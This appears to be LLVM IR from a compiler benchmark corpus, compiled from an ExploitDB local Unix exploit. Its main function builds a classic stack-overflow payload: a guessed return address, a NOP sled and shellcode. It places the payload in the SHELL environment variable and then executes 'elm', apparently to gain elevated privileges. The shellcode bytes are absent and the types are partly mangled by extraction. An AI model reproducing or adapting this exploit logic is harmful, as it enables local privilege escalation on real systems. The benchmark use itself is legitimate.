; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19972.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19972.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFFER = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [41 x i8] c"Address: 0x%lx\0AOffset: %d\0AShellSize: %d\0A\00", align 1
@shellcode = common dso_local global i32 0, align 4
@NOP = common dso_local global i8 0, align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"SHELL\00", align 1
@PATH = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [4 x i8] c"elm\00", align 1
@.str.3 = private unnamed_addr constant [25 x i8] c"Kurwa Mac! No %s file ?\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* @BUFFER, align 4
  %12 = zext i32 %11 to i64
  %13 = call i8* @llvm.stacksave()
  store i8* %13, i8** %6, align 8
  %14 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %7, align 8
  store i32 0, i32* %9, align 4
  %15 = load i32, i32* %4, align 4
  %16 = icmp sgt i32 %15, 1
  br i1 %16, label %17, label %22

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 1
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 @atoi(i8* %20)
  store i32 %21, i32* %9, align 4
  br label %22

22:                                               ; preds = %17, %2
  %23 = call i32 (...) @get_esp()
  %24 = load i32, i32* %9, align 4
  %25 = add nsw i32 %23, %24
  %26 = sext i32 %25 to i64
  store i64 %26, i64* %10, align 8
  %27 = load i32, i32* @stderr, align 4
  %28 = load i64, i64* %10, align 8
  %29 = load i32, i32* %9, align 4
  %30 = load i32, i32* @shellcode, align 4
  %31 = call i32 @strlen(i32 %30)
  %32 = call i32 (i32, i8*, ...) @fprintf(i32 %27, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str, i64 0, i64 0), i64 %28, i32 %29, i32 %31)
  store i32 3, i32* %8, align 4
  br label %33

33:                                               ; preds = %44, %22
  %34 = load i32, i32* %8, align 4
  %35 = load i32, i32* @BUFFER, align 4
  %36 = icmp slt i32 %34, %35
  br i1 %36, label %37, label %47

37:                                               ; preds = %33
  %38 = load i64, i64* %10, align 8
  %39 = trunc i64 %38 to i32
  %40 = load i32, i32* %8, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %14, i64 %41
  %43 = bitcast i8* %42 to i32*
  store i32 %39, i32* %43, align 1
  br label %44

44:                                               ; preds = %37
  %45 = load i32, i32* %8, align 4
  %46 = add nsw i32 %45, 4
  store i32 %46, i32* %8, align 4
  br label %33

47:                                               ; preds = %33
  store i32 0, i32* %8, align 4
  br label %48

48:                                               ; preds = %60, %47
  %49 = load i32, i32* %8, align 4
  %50 = load i32, i32* @BUFFER, align 4
  %51 = load i32, i32* @shellcode, align 4
  %52 = call i32 @strlen(i32 %51)
  %53 = sub nsw i32 %50, %52
  %54 = icmp slt i32 %49, %53
  br i1 %54, label %55, label %63

55:                                               ; preds = %48
  %56 = load i8, i8* @NOP, align 1
  %57 = load i32, i32* %8, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %14, i64 %58
  store i8 %56, i8* %59, align 1
  br label %60

60:                                               ; preds = %55
  %61 = load i32, i32* %8, align 4
  %62 = add nsw i32 %61, 1
  store i32 %62, i32* %8, align 4
  br label %48

63:                                               ; preds = %48
  %64 = load i32, i32* @BUFFER, align 4
  %65 = load i32, i32* @shellcode, align 4
  %66 = call i32 @strlen(i32 %65)
  %67 = sub nsw i32 %64, %66
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %14, i64 %68
  %70 = load i32, i32* @shellcode, align 4
  %71 = load i32, i32* @shellcode, align 4
  %72 = call i32 @strlen(i32 %71)
  %73 = call i32 @memcpy(i8* %69, i32 %70, i32 %72)
  %74 = call i32 @setenv(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i8* %14, i32 1)
  %75 = load i8*, i8** @PATH, align 8
  %76 = call i64 @execl(i8* %75, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0), i32 0)
  %77 = icmp slt i64 %76, 0
  br i1 %77, label %78, label %82

78:                                               ; preds = %63
  %79 = load i32, i32* @stderr, align 4
  %80 = load i8*, i8** @PATH, align 8
  %81 = call i32 (i32, i8*, ...) @fprintf(i32 %79, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0), i8* %80)
  br label %82

82:                                               ; preds = %78, %63
  store i32 0, i32* %3, align 4
  %83 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %83)
  %84 = load i32, i32* %3, align 4
  ret i32 %84
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @get_esp(...) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @setenv(i8*, i8*, i32) #2

declare dso_local i64 @execl(i8*, i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
